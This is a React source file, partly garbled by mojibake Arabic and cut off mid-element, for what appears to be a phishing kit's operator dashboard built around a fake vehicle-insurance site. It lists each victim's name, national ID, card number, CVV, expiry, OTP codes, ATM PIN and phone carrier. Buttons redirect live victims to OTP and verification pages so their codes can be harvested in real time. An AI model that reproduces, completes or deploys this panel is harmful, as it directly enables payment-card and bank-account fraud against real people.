Ã¯Â»Â¿import { useEffect, useMemo, useState, useCallback, useRef, type ReactNode } from "react";
import { useLocation } from "wouter";
import { getToken, logoutAdmin } from "@/lib/auth";
import { getAdminStats, listAdminSubmissions, sendAdminControl, adminLogoutAll, adminChangePassword, getAllAdminSubmissions, getTrackedSessions, type SessionTrackingInfo } from "@/lib/api";
import { getAdminSettings, saveAdminSettings, getBlockedSessions, blockSession, unblockSession, getTrashItems, moveSubmissionToTrash, restoreTrashItem, deleteTrashItem, clearTrash } from "@/lib/admin-store";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  LogOut,
  Clock,
  ShieldCheck,
  CreditCard,
  KeyRound,
  Banknote,
  ChevronDown,
  ChevronUp,
} from "lucide-react";
import { ToastContainer, toast } from "@/lib/toast-store";

interface SubmissionRow {
  id: number;
  sessionId: string;
  type: string;
  data: string | null;
  ipAddress: string | null;
  createdAt: string;
  userAgent?: string | null;
}

interface StatsType {
  totalSessions: number;
  totalSubmissions: number;
  byType: { type: string; count: number }[];
}

function parseData(raw: string | null): Record<string, string> {
  if (!raw) return {};
  try {
    return JSON.parse(raw) as Record<string, string>;
  } catch {
    return {};
  }
}

function formatAgo(iso: string) {
  const diff = Date.now() - new Date(iso).getTime();
  const secs = Math.floor(diff / 1000);
  if (secs < 60) return `${secs}ÃÂ«`;
  const mins = Math.floor(secs / 60);
  if (mins < 60) return `${mins}ÃÂ¯`;
  return `${Math.floor(mins / 60)}ÃÂ³`;
}

function formatTimeCounter(iso: string) {
  const diff = Date.now() - new Date(iso).getTime();
  const secs = Math.floor(diff / 1000);
  
  if (secs < 60) {
    return `ÃÂÃÂÃÂ° ${secs} ÃÂ«ÃÂ§ÃÂÃÂÃÂ©`;
  }
  
  const mins = Math.floor(secs / 60);
  if (mins < 60) {
    const remainingSecs = secs % 60;
    return `ÃÂÃÂÃÂ° ${mins} ÃÂ¯ÃÂÃÂÃÂÃÂ©${remainingSecs > 0 ? ` ÃÂ ${remainingSecs} ÃÂ«ÃÂ§ÃÂÃÂÃÂ©` : ""}`;
  }
  
  const hours = Math.floor(mins / 60);
  if (hours < 24) {
    const remainingMins = mins % 60;
    return `ÃÂÃÂÃÂ° ${hours} ÃÂ³ÃÂ§ÃÂ¹ÃÂ©${remainingMins > 0 ? ` ÃÂ ${remainingMins} ÃÂ¯ÃÂÃÂÃÂÃÂ©` : ""}`;
  }
  
  const days = Math.floor(hours / 24);
  if (days < 7) {
    const remainingHours = hours % 24;
    return `ÃÂÃÂÃÂ° ${days} ÃÂÃÂÃÂ${remainingHours > 0 ? ` ÃÂ ${remainingHours} ÃÂ³ÃÂ§ÃÂ¹ÃÂ©` : ""}`;
  }
  
  const weeks = Math.floor(days / 7);
  if (weeks < 4) {
    const remainingDays = days % 7;
    return `ÃÂÃÂÃÂ° ${weeks} ÃÂ§ÃÂ³ÃÂ¨ÃÂÃÂ¹${remainingDays > 0 ? ` ÃÂ ${remainingDays} ÃÂÃÂÃÂ` : ""}`;
  }
  
  // For older records, show actual date
  const date = new Date(iso);
  return date.toLocaleDateString("ar-SA", { year: "numeric", month: "short", day: "numeric" });
}

function getTypeArabic(type: string): string {
  const typeMap: Record<string, string> = {
    "initial": "ÃÂ§ÃÂÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂ´ÃÂ®ÃÂµÃÂÃÂ©",
    "vehicle": "ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ¨ÃÂ©",
    "payment": "ÃÂ§ÃÂÃÂ¯ÃÂÃÂ¹",
    "card": "ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ©",
    "atm": "ÃÂµÃÂ±ÃÂ§ÃÂ ATM",
    "nomer": "ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ­ÃÂ³ÃÂ§ÃÂ¨",
    "nomer_otp": "OTP ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ­ÃÂ³ÃÂ§ÃÂ¨",
    "otp_attempt_1": "ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ (ÃÂÃÂ­ÃÂ§ÃÂÃÂÃÂ© 1)",
    "otp_attempt_2": "ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ (ÃÂÃÂ­ÃÂ§ÃÂÃÂÃÂ© 2)",
    "otp_attempt_3": "ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ (ÃÂÃÂ­ÃÂ§ÃÂÃÂÃÂ© 3)",
  };
  return typeMap[type] || type.toUpperCase();
}

function StatCard({ label, value, icon, color, onClick }: { label: string; value: number; icon: ReactNode; color: string; onClick?: () => void }) {
  return (
    <button
      type="button"
      onClick={onClick}
      disabled={!onClick}
      className={`rounded-3xl border bg-white p-4 text-right shadow-sm transition ${onClick ? "hover:shadow-md cursor-pointer active:scale-[0.98]" : "cursor-default"}`}
    >
      <div className="flex items-center justify-between mb-3">
        <div className={`w-11 h-11 rounded-2xl flex items-center justify-center ${color}`}>{icon}</div>
        <span className="text-3xl font-bold text-slate-900">{value}</span>
      </div>
      <p className="text-xs text-slate-500">{label}</p>
      {onClick && <p className="text-xs text-blue-500 mt-2">ÃÂ§ÃÂÃÂÃÂ± ÃÂÃÂÃÂªÃÂÃÂ§ÃÂµÃÂÃÂ</p>}
    </button>
  );
}

function SessionHistoryDialog({ open, rows, onClose }: { open: boolean; rows: SubmissionRow[]; onClose: () => void }) {
  if (!open) return null;
  
  // Sort rows by ID descending (newest first) for display
  const sortedRows = [...rows].sort((a, b) => b.id - a.id);
  
  return (
    <Dialog open onOpenChange={(value) => !value && onClose()}>
      <DialogContent className="sm:max-w-[760px] max-h-[85vh] flex flex-col" dir="rtl">
        <DialogHeader>
          <DialogTitle>ÃÂ³ÃÂ¬ÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ³ÃÂ©</DialogTitle>
        </DialogHeader>
        <ScrollArea className="flex-1 mt-4">
          <div className="space-y-4">
            {sortedRows.map((row) => {
              const data = parseData(row.data);
              return (
                <div key={row.id} className="rounded-3xl border border-slate-200 bg-white p-4">
                  <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between text-xs text-slate-500 mb-3">
                    <span>{row.type.toUpperCase()}</span>
                    <span dir="ltr">{formatAgo(row.createdAt)}</span>
                  </div>
                  <div className="grid gap-3 sm:grid-cols-2 text-xs text-slate-700">
                    {Object.entries(data).map(([key, value]) => (
                      <div key={key} className="rounded-2xl bg-slate-50 p-3">
                        <div className="font-semibold text-slate-900">{key}</div>
                        <div className="mt-1 font-mono break-all">{String(value ?? "")}</div>
                      </div>
                    ))}
                    <div className="rounded-2xl bg-slate-50 p-3 text-[11px] text-slate-500">
                      <div>IP: {row.ipAddress ?? "ÃÂºÃÂÃÂ± ÃÂÃÂ¹ÃÂ±ÃÂÃÂ"}</div>
                      <div>ÃÂ§ÃÂÃÂÃÂ³ÃÂªÃÂ®ÃÂ¯ÃÂ: {row.userAgent ?? "ÃÂºÃÂÃÂ± ÃÂÃÂ¹ÃÂ±ÃÂÃÂ"}</div>
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        </ScrollArea>
      </DialogContent>
    </Dialog>
  );
}

// Page Arabic names mapping
function getPageArabic(page: string): string {
  const pageMap: Record<string, string> = {
    "/": "ÃÂ§ÃÂÃÂµÃÂÃÂ­ÃÂ© ÃÂ§ÃÂÃÂ±ÃÂ¦ÃÂÃÂ³ÃÂÃÂ©",
    "/form": "ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ¨ÃÂ©",
    "/select": "ÃÂ§ÃÂ®ÃÂªÃÂÃÂ§ÃÂ± ÃÂ§ÃÂÃÂ¨ÃÂ§ÃÂÃÂ©",
    "/total": "ÃÂÃÂÃÂ®ÃÂµ ÃÂ§ÃÂÃÂªÃÂÃÂÃÂÃÂ©",
    "/total2": "ÃÂªÃÂ£ÃÂÃÂÃÂ¯ ÃÂ§ÃÂÃÂªÃÂÃÂÃÂÃÂ©",
    "/visa": "ÃÂ§ÃÂÃÂ¯ÃÂÃÂ¹ ÃÂ¨ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ©",
    "/otp": "ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ",
    "/otp2": "ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ (ÃÂÃÂ­ÃÂ§ÃÂÃÂÃÂ© 2)",
    "/otp3": "ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ (ÃÂÃÂ­ÃÂ§ÃÂÃÂÃÂ© 3)",
    "/atm": "ÃÂµÃÂ±ÃÂ§ÃÂ ATM",
    "/nomer": "ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ­ÃÂ³ÃÂ§ÃÂ¨",
    "/nomer-wait": "ÃÂ§ÃÂÃÂªÃÂ¸ÃÂ§ÃÂ± ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ",
    "/nomer-otp": "ÃÂ±ÃÂÃÂ² ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ ÃÂÃÂÃÂ­ÃÂ³ÃÂ§ÃÂ¨",
    "/identity-check": "ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ ÃÂÃÂ ÃÂ§ÃÂÃÂÃÂÃÂÃÂ©",
    "/waiting": "ÃÂÃÂ§ÃÂ¦ÃÂÃÂ© ÃÂ§ÃÂÃÂ§ÃÂÃÂªÃÂ¸ÃÂ§ÃÂ±",
  };
  return pageMap[page] || page || "ÃÂºÃÂÃÂ± ÃÂÃÂ¹ÃÂ±ÃÂÃÂ";
}

function SessionBox({
  sessionId,
  rows,
  blocked,
  selected,
  onToggleSelect,
  onControl,
  onBlock,
  onUnblock,
  onDelete,
  onOpenHistory,
  currentPage,
  isOnline,
}: {
  sessionId: string;
  rows: SubmissionRow[];
  blocked?: string;
  selected: boolean;
  onToggleSelect: () => void;
  onControl: (sessionId: string, action: string, code?: string) => Promise<void>;
  onBlock: () => void;
  onUnblock: () => void;
  onDelete: () => void;
  onOpenHistory: () => void;
  currentPage?: string;
  isOnline?: boolean;
}) {
  const [expanded, setExpanded] = useState(true);
  const [historyExpanded, setHistoryExpanded] = useState(false);
  const [loadingAction, setLoadingAction] = useState<string | null>(null);

  // Rows are already sorted by ID DESC (newest first) from parent useMemo
  const initialRow = rows.find((row) => row.type === "initial");
  const initialData = parseData(initialRow?.data ?? null);
  const name = initialData.ownerName || "ÃÂÃÂ³ÃÂªÃÂ®ÃÂ¯ÃÂ";
  const phone = initialData.phone || "ÃÂ¨ÃÂ¯ÃÂÃÂ ÃÂÃÂ§ÃÂªÃÂ";
  const cardRows = rows.filter((row) => row.type === "card");
  // Use FIRST card (newest) since rows are sorted by ID desc
  const latestCard = cardRows[0];
  const cardData = parseData(latestCard?.data ?? null);
  const otpRows = rows.filter((row) => row.type.startsWith("otp"));
  const atmRows = rows.filter((row) => row.type === "atm");
  const nomerRows = rows.filter((row) => row.type === "nomer");
  const nomerOtpRows = rows.filter((row) => row.type === "nomer_otp");
  // Use first row (newest) for lastActivity since rows are sorted desc by id
  const lastActivity = rows[0]?.createdAt;

  const statusBadge = blocked
    ? <Badge className="bg-red-100 text-red-700 border-red-200 text-[10px]">ÃÂÃÂ­ÃÂ¸ÃÂÃÂ±</Badge>
    : otpRows.length > 0
      ? <Badge className="bg-green-100 text-green-700 border-green-200 text-[10px]">OTP Ã¢ÂÂ</Badge>
      : cardRows.length > 0
        ? <Badge className="bg-orange-100 text-orange-700 border-orange-200 text-[10px] animate-pulse">ÃÂÃÂÃÂªÃÂ¸ÃÂ±</Badge>
        : <Badge variant="outline" className="text-slate-400 text-[10px]">ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂÃÂÃÂ·</Badge>;

  const formattedCard = latestCard && cardData.cardNumber
    ? cardData.cardNumber.replace(/(.{4})/g, "$1 ").trim()
    : "Ã¢ÂÂ";

  useEffect(() => {
    setExpanded(cardRows.length > 0 || otpRows.length > 0);
  }, [cardRows.length, otpRows.length]);

  const handleControl = async (action: string, code?: string) => {
    setLoadingAction(action);
    try {
      await onControl(sessionId, action, code);
    } finally {
      setLoadingAction(null);
    }
  };

  return (
    <div className={`rounded-3xl border bg-white shadow-sm transition ${selected ? "ring-2 ring-blue-400" : ""}`}>
      <div className="p-4">
        <div className="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
          <div className="flex items-start gap-3">
            <input
              type="checkbox"
              checked={selected}
              onChange={onToggleSelect}
              className="mt-1 h-4 w-4 rounded border-slate-300 text-blue-600 focus:ring-blue-500"
            />
            <div className="min-w-0 text-right">
              <button type="button" onClick={() => setExpanded((value) => !value)} className="w-full text-right">
                <div className="flex items-center justify-between gap-3">
                  <div className="space-y-1">
                    <div className="flex items-center gap-2">
                      {/* Online/Offline Status Indicator */}
                      <span className={`w-2 h-2 rounded-full ${isOnline ? "bg-green-500 animate-pulse" : "bg-gray-400"}`} />
                      <p className="text-sm font-semibold text-slate-900 truncate">{name}</p>
                    </div>
                    <p className="text-xs text-slate-500" dir="ltr">{phone}</p>
                    {/* Current Page */}
                    <p className="text-[10px] text-blue-600 font-medium">
                      Ã°ÂÂÂ {getPageArabic(currentPage || "")}
                    </p>
                  </div>
                  <div className="flex items-center gap-2 text-xs text-slate-500">
                    <span dir="ltr">{lastActivity ? formatAgo(lastActivity) : "Ã¢ÂÂ"}</span>
                    {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </div>
                </div>
                <div className="mt-2 flex items-center justify-between gap-2">
                  {statusBadge}
                  <span className="text-[11px] text-slate-400">#{sessionId.slice(0, 8)}</span>
                </div>
              </button>
            </div>
          </div>

          <div className="flex flex-wrap gap-2 self-end">
            <button
              type="button"
              onClick={blocked ? onUnblock : onBlock}
              className={`rounded-2xl px-3 py-2 text-xs font-semibold ${blocked ? "border border-green-200 bg-green-50 text-green-700 hover:bg-green-100" : "border border-slate-200 bg-slate-50 text-slate-700 hover:bg-slate-100"}`}
            >{blocked ? "ÃÂ±ÃÂÃÂ¹ ÃÂ§ÃÂÃÂ­ÃÂ¸ÃÂ±" : "ÃÂ­ÃÂ¸ÃÂ±"}</button>
            <button
              type="button"
              onClick={onDelete}
              className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
            >ÃÂ³ÃÂÃÂ© ÃÂ§ÃÂÃÂÃÂÃÂÃÂÃÂ§ÃÂª</button>
          </div>
        </div>

        {expanded && (
          <div className="mt-4 space-y-4 border-t border-slate-100 pt-4">
            {/* ÃÂµÃÂÃÂ¯ÃÂÃÂ ÃÂ§ÃÂÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ¨ÃÂ© */}
            <div className="rounded-3xl border border-slate-200 bg-slate-50 p-4">
              <p className="text-xs font-semibold text-slate-500 mb-3">ÃÂ§ÃÂÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ¨ÃÂ©</p>
              
              {/* ÃÂ§ÃÂÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂ´ÃÂ®ÃÂµÃÂÃÂ© */}
              <div className="mb-4">
                <p className="text-[10px] text-slate-400 mb-2">ÃÂ§ÃÂÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂ´ÃÂ®ÃÂµÃÂÃÂ©</p>
                <div className="grid gap-2 sm:grid-cols-2 text-xs">
                  <div className="rounded-xl bg-white p-2">ÃÂ§ÃÂÃÂ§ÃÂ³ÃÂ: <span className="font-semibold">{name}</span></div>
                  <div className="rounded-xl bg-white p-2">ÃÂ§ÃÂÃÂÃÂ§ÃÂªÃÂ: <span className="font-semibold" dir="ltr">{phone}</span></div>
                  <div className="rounded-xl bg-white p-2">ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂÃÂÃÂÃÂ©: <span className="font-semibold" dir="ltr">{initialData.idNumber ?? "Ã¢ÂÂ"}</span></div>
                  <div className="rounded-xl bg-white p-2">ÃÂÃÂÃÂ¹ ÃÂ§ÃÂÃÂªÃÂ§ÃÂÃÂÃÂ: <span className="font-semibold">{initialData.insuranceType ?? "Ã¢ÂÂ"}</span></div>
                </div>
              </div>

              {/* ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ© */}
              {latestCard ? (
                <div>
                  <p className="text-[10px] text-slate-400 mb-2">ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ©</p>
                  <div className="grid gap-2 sm:grid-cols-2 text-xs">
                    <div className="rounded-xl bg-white p-2 sm:col-span-2">
                      ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ©: <span className="font-mono font-semibold" dir="ltr">{formattedCard}</span>
                    </div>
                    <div className="rounded-xl bg-white p-2">ÃÂ§ÃÂÃÂÃÂ§ÃÂÃÂ: <span className="font-semibold">{cardData.cardHolder ?? "Ã¢ÂÂ"}</span></div>
                    <div className="rounded-xl bg-white p-2">ÃÂªÃÂ§ÃÂ±ÃÂÃÂ® ÃÂ§ÃÂÃÂ§ÃÂÃÂªÃÂÃÂ§ÃÂ¡: <span className="font-semibold" dir="ltr">{cardData.expiry ?? "Ã¢ÂÂ"}</span></div>
                    <div className="rounded-xl bg-white p-2">CVV: <span className="font-semibold" dir="ltr">{cardData.cvv ?? "Ã¢ÂÂ"}</span></div>
                  </div>
                </div>
              ) : (
                <div className="rounded-3xl border border-dashed border-slate-300 bg-white p-3 text-xs text-slate-500 text-center">
                  ÃÂÃÂ§ ÃÂªÃÂÃÂ¬ÃÂ¯ ÃÂ¨ÃÂ·ÃÂ§ÃÂÃÂ© ÃÂ­ÃÂªÃÂ ÃÂ§ÃÂÃÂ¢ÃÂ
                </div>
              )}
            </div>

            {otpRows.length > 0 && (
              <div className="rounded-3xl border border-slate-200 bg-white p-4">
                <div className="flex items-center justify-between text-xs font-semibold text-green-700 mb-3">
                  <span>ÃÂ±ÃÂÃÂÃÂ² OTP</span>
                  <span>{otpRows.length} ÃÂ±ÃÂÃÂ²</span>
                </div>
                <div className="space-y-2">
                  {otpRows.map((otp, index) => {
                    const data = parseData(otp.data);
                    return (
                      <div key={otp.id} className="rounded-2xl bg-green-50 p-3 text-xs text-slate-700">
                        <div className="flex items-center justify-between gap-3 mb-2">
                          <span className="font-semibold text-green-700">ÃÂÃÂ­ÃÂ§ÃÂÃÂÃÂ© {index + 1}</span>
                          <span className="text-slate-500" dir="ltr">{formatAgo(otp.createdAt)}</span>
                        </div>
                        <div className="font-mono text-base font-bold text-green-900" dir="ltr">{data.otpCode ?? "Ã¢ÂÂ"}</div>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {atmRows.length > 0 && (
              <div className="rounded-3xl border border-slate-200 bg-white p-4 text-xs text-slate-700">
                <div className="flex items-center justify-between mb-3 text-slate-500">
                  <span>ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ATM</span>
                </div>
                {atmRows.map((atm) => {
                  const data = parseData(atm.data);
                  return (
                    <div key={atm.id} className="rounded-2xl bg-slate-50 p-3 mb-2">
                      <div className="flex items-center justify-between text-slate-500 text-[11px] mb-1">
                        <span>ÃÂ±ÃÂÃÂ² ATM</span>
                        <span dir="ltr">{formatAgo(atm.createdAt)}</span>
                      </div>
                      <div className="font-mono font-semibold">{data.atmCode ?? "Ã¢ÂÂ"}</div>
                    </div>
                  );
                })}
              </div>
            )}

            {/* ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ */}
            {nomerRows.length > 0 && (
              <div className="rounded-3xl border border-blue-200 bg-blue-50 p-4">
                <div className="flex items-center justify-between text-xs font-semibold text-blue-700 mb-3">
                  <span>ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ</span>
                  <span>{nomerRows.length} ÃÂ¥ÃÂ¯ÃÂ®ÃÂ§ÃÂ</span>
                </div>
                {nomerRows.map((nomer) => {
                  const data = parseData(nomer.data);
                  const providerNames: Record<string, string> = {
                    stc: "STC",
                    mobily: "ÃÂÃÂÃÂ¨ÃÂ§ÃÂÃÂÃÂ",
                    zain: "ÃÂ²ÃÂÃÂ",
                    jawra: "ÃÂ¬ÃÂÃÂ§ÃÂ"
                  };
                  return (
                    <div key={nomer.id} className="rounded-2xl bg-white p-3 mb-2">
                      <div className="flex items-center justify-between text-slate-500 text-[11px] mb-2">
                        <span>ÃÂ¥ÃÂ¯ÃÂ®ÃÂ§ÃÂ ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ</span>
                        <span dir="ltr">{formatAgo(nomer.createdAt)}</span>
                      </div>
                      <div className="space-y-1 text-xs">
                        <div className="flex justify-between">
                          <span className="text-slate-500">ÃÂÃÂ²ÃÂÃÂ¯ ÃÂ§ÃÂÃÂ®ÃÂ¯ÃÂÃÂ©:</span>
                          <span className="font-semibold">{providerNames[data.provider] ?? data.provider ?? "Ã¢ÂÂ"}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-slate-500">ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ:</span>
                          <span className="font-mono font-semibold" dir="ltr">{data.phone ?? "Ã¢ÂÂ"}</span>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}

            {/* ÃÂ±ÃÂÃÂ² ÃÂªÃÂ­ÃÂÃÂ ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ */}
            {nomerOtpRows.length > 0 && (
              <div className="rounded-3xl border border-green-200 bg-green-50 p-4">
                <div className="flex items-center justify-between text-xs font-semibold text-green-700 mb-3">
                  <span>ÃÂ±ÃÂÃÂ² ÃÂªÃÂ­ÃÂÃÂ ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂ¬ÃÂÃÂ§ÃÂ</span>
                  <span>{nomerOtpRows.length} ÃÂ±ÃÂÃÂ²</span>
                </div>
                <div className="space-y-2">
                  {nomerOtpRows.map((otp, index) => {
                    const data = parseData(otp.data);
                    return (
                      <div key={otp.id} className="rounded-2xl bg-white p-3">
                        <div className="flex items-center justify-between text-slate-500 text-[11px] mb-2">
                          <span>ÃÂÃÂ­ÃÂ§ÃÂÃÂÃÂ© {index + 1}</span>
                          <span dir="ltr">{formatAgo(otp.createdAt)}</span>
                        </div>
                        <div className="font-mono text-base font-bold text-green-900 text-center" dir="ltr">
                          {data.otpCode ?? "Ã¢ÂÂ"}
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {/* ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ ÃÂÃÂ ÃÂ§ÃÂÃÂÃÂÃÂÃÂ© */}
            <div className="rounded-3xl border border-purple-200 bg-purple-50 p-4">
              <div className="text-xs font-semibold text-purple-700 mb-3">ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ ÃÂÃÂ ÃÂ§ÃÂÃÂÃÂÃÂÃÂ©</div>
              <div className="flex gap-2">
                <input
                  type="text"
                  id={`identity-code-${sessionId}`}
                  placeholder="ÃÂ±ÃÂÃÂ ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ (ÃÂÃÂ«ÃÂ: 5)"
                  className="flex-1 rounded-2xl border border-purple-200 bg-white px-4 py-2 text-sm text-center font-mono focus:border-purple-400 focus:outline-none focus:ring-2 focus:ring-purple-100"
                  maxLength={10}
                />
                <button
                  type="button"
                  disabled={loadingAction === "identity_code"}
                  onClick={async () => {
                    const input = document.getElementById(`identity-code-${sessionId}`) as HTMLInputElement;
                    const code = input?.value?.trim();
                    if (!code) return;
                    setLoadingAction("identity_code");
                    try {
                      await onControl(sessionId, "identity_code", code);
                    } finally {
                      setLoadingAction(null);
                      if (input) input.value = "";
                    }
                  }}
                  className="rounded-2xl bg-purple-600 px-4 py-2 text-xs font-semibold text-white hover:bg-purple-700 disabled:cursor-not-allowed disabled:opacity-50"
                >
                  {loadingAction === "identity_code" ? "ÃÂ¬ÃÂ§ÃÂ±ÃÂ..." : "ÃÂ¥ÃÂ±ÃÂ³ÃÂ§ÃÂ"}
                </button>
              </div>
              <p className="mt-2 text-[10px] text-purple-600">ÃÂ£ÃÂ¯ÃÂ®ÃÂ ÃÂ±ÃÂÃÂ ÃÂ£ÃÂ ÃÂÃÂµ ÃÂÃÂÃÂ¸ÃÂÃÂ± ÃÂÃÂÃÂ¹ÃÂÃÂÃÂ ÃÂÃÂÃÂ±ÃÂ§ÃÂ</p>
            </div>

            {/* ÃÂ£ÃÂ²ÃÂ±ÃÂ§ÃÂ± ÃÂ§ÃÂÃÂªÃÂ­ÃÂÃÂ */}
            <div className="space-y-3">
              <p className="text-[10px] text-slate-400 font-semibold">ÃÂ¥ÃÂ¹ÃÂ§ÃÂ¯ÃÂ© ÃÂ§ÃÂÃÂªÃÂÃÂ¬ÃÂÃÂ</p>
              <div className="grid gap-2 sm:grid-cols-2">
                <button
                  type="button"
                  disabled={loadingAction === "go_home"}
                  onClick={() => void handleControl("go_home")}
                  className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_home" ? "...ÃÂ¬ÃÂ§ÃÂ±ÃÂ" : "Ã°ÂÂÂ  ÃÂ§ÃÂÃÂ±ÃÂ¦ÃÂÃÂ³ÃÂÃÂ©"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_form"}
                  onClick={() => void handleControl("go_form")}
                  className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_form" ? "...ÃÂ¬ÃÂ§ÃÂ±ÃÂ" : "Ã°ÂÂÂ ÃÂ¨ÃÂÃÂ§ÃÂÃÂ§ÃÂª ÃÂ§ÃÂÃÂÃÂ±ÃÂÃÂ¨ÃÂ©"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_select"}
                  onClick={() => void handleControl("go_select")}
                  className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_select" ? "...ÃÂ¬ÃÂ§ÃÂ±ÃÂ" : "Ã°ÂÂÂ¢ ÃÂ§ÃÂ®ÃÂªÃÂÃÂ§ÃÂ± ÃÂ§ÃÂÃÂªÃÂ£ÃÂÃÂÃÂ"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_visa"}
                  onClick={() => void handleControl("go_visa")}
                  className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_visa" ? "...ÃÂ¬ÃÂ§ÃÂ±ÃÂ" : "Ã°ÂÂÂ³ ÃÂ§ÃÂÃÂÃÂÃÂ²ÃÂ§"}</button>
              </div>
              
              <p className="text-[10px] text-slate-400 font-semibold pt-2">ÃÂ§ÃÂÃÂªÃÂÃÂ¬ÃÂÃÂ ÃÂÃÂ</p>
              <div className="grid gap-2 sm:grid-cols-4">
                <button
                  type="button"
                  disabled={loadingAction === "go_otp"}
                  onClick={() => void handleControl("go_otp")}
                  className="rounded-2xl bg-green-600 px-2 py-2 text-xs font-semibold text-white hover:bg-green-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_otp" ? "..." : "Ã°ÂÂÂ OTP"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_nomer"}
                  onClick={() => void handleControl("go_nomer")}
                  className="rounded-2xl bg-blue-600 px-2 py-2 text-xs font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_nomer" ? "..." : "Ã°ÂÂÂ± Nomer"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_nomer_otp"}
                  onClick={() => void handleControl("go_nomer_otp")}
                  className="rounded-2xl bg-blue-600 px-2 py-2 text-xs font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
                >{loadingAction === "go_nomer_otp" ? "..." : "Ã°ÂÂÂ± N-OTP"}</button>
                <button
                  type="button"
                  disabled={loadingAction === "go_identity_check"}
                  onClick={() => void handleControl("go_identity_check")}
                  className="rounded-2xl bg-purple-600 px-2 py-2 text-xs font-semibold text-white hover:bg-purple-700 disabled:cursor-not-allowed disabled:opacity-50"
